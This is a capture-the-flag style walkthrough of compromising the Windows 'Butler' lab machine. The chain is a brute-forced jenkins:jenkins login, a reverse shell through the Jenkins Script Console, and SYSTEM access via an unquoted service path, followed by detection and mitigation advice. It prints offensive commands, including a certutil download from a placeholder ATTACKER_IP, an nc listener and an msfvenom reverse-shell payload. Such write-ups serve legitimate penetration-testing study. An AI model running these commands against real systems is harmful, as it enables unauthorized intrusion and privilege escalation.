# Butler - TCM Machine Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/Difficulty-Easy%20to%20Medium-green">
  <img src="https://img.shields.io/badge/OS-Windows-blue">
  <img src="https://img.shields.io/badge/Status-SYSTEM-success">
</p>

# Table of Contents

- [Overview](#overview)
- [Executive Summary](#executive-summary)
- [Objectives](#objectives)
- [Target Information](#target-information)
- [Methodology and Mindset](#methodology-and-mindset)
- [Attack Path](#attack-path)
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
  - [Network Enumeration](#network-enumeration)
  - [Web Enumeration](#web-enumeration)
  - [Credential Discovery](#credential-discovery)
- [Initial Exploitation](#initial-exploitation)
- [Post Exploitation](#post-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flag Capture](#flag-capture)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Detection Opportunities](#detection-opportunities)
- [Mitigations and Recommendations](#mitigations-and-recommendations)
- [Final Observations](#final-observations)
- [References](#references)

# Overview
This assessment demonstrates the compromise of the **Butler** Windows machine through weak Jenkins credentials and an unquoted service path vulnerability, ultimately resulting in full **NT AUTHORITY\\SYSTEM** access.

# Executive Summary
The assessment identified two major weaknesses:

1. Public exposure of a Jenkins administration interface protected by weak credentials (`jenkins:jenkins`).
2. A Windows service configured with an unquoted executable path and insecure permissions.

An attacker exploiting these issues could:
- Obtain remote administrative access.
- Execute arbitrary commands on the server.
- Deploy malware or ransomware.
- Steal sensitive information.
- Use the server as a pivot point into internal infrastructure.

Business impact includes service disruption, data loss, credential compromise, and potential complete domain compromise if the server is connected to enterprise environments.

# Objectives
- Enumerate exposed services.
- Identify initial access vectors.
- Achieve remote code execution.
- Escalate privileges to SYSTEM.
- Document findings and mitigation recommendations.

# Target Information

| Item | Value |
|------|--------|
| Target IP | 192.168.126.137 |
| Operating System | Windows |
| Open Ports | 445, 7680, 8080 |
| Initial User | butler |
| Final Access | NT AUTHORITY\\SYSTEM |

# Methodology and Mindset

Questions followed during the assessment:

- What information do I currently have?
- What assumptions can I make?
- What can I verify?
- What does this information allow me to do next?
- What is the most likely path to compromise?

# Attack Path

```text
Recon → Jenkins Discovery → Credential Brute Force
→ Script Console RCE → Reverse Shell
→ winPEAS Enumeration
→ Unquoted Service Path Abuse
→ SYSTEM Shell
```

# Reconnaissance

## Network Enumeration

```bash
nmap -sn 192.168.126.0/24
nmap -sS -A -T4 -p- 192.168.126.137
```

Discovered services:

- TCP/445 – SMB
- TCP/7680 – Windows Update Delivery Optimization
- TCP/8080 – Web Application (Jenkins)

### Pentester Observation
The presence of Jenkins on a non-standard port immediately increased the attack surface. Administrative applications exposed to untrusted networks often become high-value targets.

# Enumeration

## Web Enumeration

```bash
feroxbuster -u http://192.168.126.137:8080 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-t 500 -r --depth 5 --scan-dir-listings
```

Browsing the application revealed a Jenkins login portal.

### Pentester Observation
Administrative panels should always be investigated carefully because they frequently expose management functions capable of executing commands or managing plugins.

## Credential Discovery

Credentials were brute-forced through intercepted login requests:

```text
Username: jenkins
Password: jenkins
```

### Pentester Observation
Default and weak credentials remain one of the most common causes of compromise and frequently provide direct administrative access.

# Initial Exploitation

After authentication, the **Manage Jenkins → Script Console** functionality was identified.

A Groovy reverse shell script was executed to establish command execution.

Listener:

```bash
nc -lvnp 8044
```

Result:

```cmd
whoami
butler
```

### Pentester Observation
The Jenkins Script Console effectively provides code execution on the host. If administrative access is achieved, full server compromise usually follows immediately.

# Post Exploitation

System information gathering:

```cmd
whoami
systeminfo
cd C:\Users\butler
```

winPEAS was transferred:

```cmd
certutil.exe -urlcache -f http://ATTACKER_IP/winPEASx64.exe winpeas.exe
```

### Pentester Observation
Enumeration is often the most important phase after gaining a shell. Misconfigurations that are not externally visible frequently appear only after local access is obtained.

# Privilege Escalation

winPEAS identified:

```text
WiseBootAssistant
No quotes and Space detected
YOU CAN MODIFY THIS SERVICE: AllAccess
```

Affected path:

```text
C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe
```

An unquoted service path vulnerability allowed execution of a malicious executable placed in a higher directory.

Payload generation:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=ATTACKER_IP \
LPORT=7777 \
-f exe > wise.exe
```

Service manipulation:

```cmd
sc stop WiseBootAssistant
sc query WiseBootAssistant
sc start WiseBootAssistant
```

Result:

```cmd
whoami
nt authority\system
```

### Pentester Observation
Unquoted service paths remain dangerous because they combine privilege escalation and persistence opportunities. Services executing as SYSTEM should always be carefully audited.

# Flag Capture

```cmd
whoami
nt authority\system
```

SYSTEM-level access successfully achieved.

# Vulnerability Assessment

| Vulnerability | Severity | CVSS v3.1 | Business Impact | Notes |
|--------------|-----------|-----------|-----------------|-------|
| Weak Jenkins Credentials | High | 8.8 | Remote administrative compromise | Public-facing administrative service |
| Jenkins Script Console Abuse | Critical | 9.8 | Arbitrary command execution | Equivalent to full server compromise |
| Unquoted Service Path | High | 7.8 | Privilege escalation to SYSTEM | Can also enable persistence |

### Notable Finding
The combination of weak credentials and an unquoted service path created a complete attack chain from unauthenticated network access to full SYSTEM compromise.

# Detection Opportunities

- Monitor authentication attempts against Jenkins.
- Alert on execution of Groovy scripts through Jenkins.
- Monitor `certutil.exe` downloads.
- Monitor creation of executables inside `C:\Program Files`.
- Alert on service stop/start events involving administrative services.

# Mitigations and Recommendations

1. Disable default and weak credentials.
2. Enforce MFA on administrative services.
3. Restrict Jenkins exposure through firewalls.
4. Disable Script Console access where possible.
5. Quote all Windows service paths.
6. Review service permissions and ACLs.
7. Implement application allow-listing.
8. Monitor administrative service modifications.

# Final Observations

This machine demonstrates how seemingly minor weaknesses can be chained into complete system compromise:

- Weak credentials enabled initial access.
- Administrative functionality provided remote code execution.
- Local enumeration revealed a privilege escalation opportunity.
- Misconfigured Windows services resulted in SYSTEM compromise.

The assessment reinforces an important penetration testing principle:

> A single low-complexity misconfiguration is rarely catastrophic by itself, but multiple small weaknesses chained together frequently result in full compromise.

# References

- MITRE ATT&CK T1574.009 – Path Interception by Unquoted Path
- PEASS-ng Project
- Jenkins Documentation
- OWASP Testing Guide
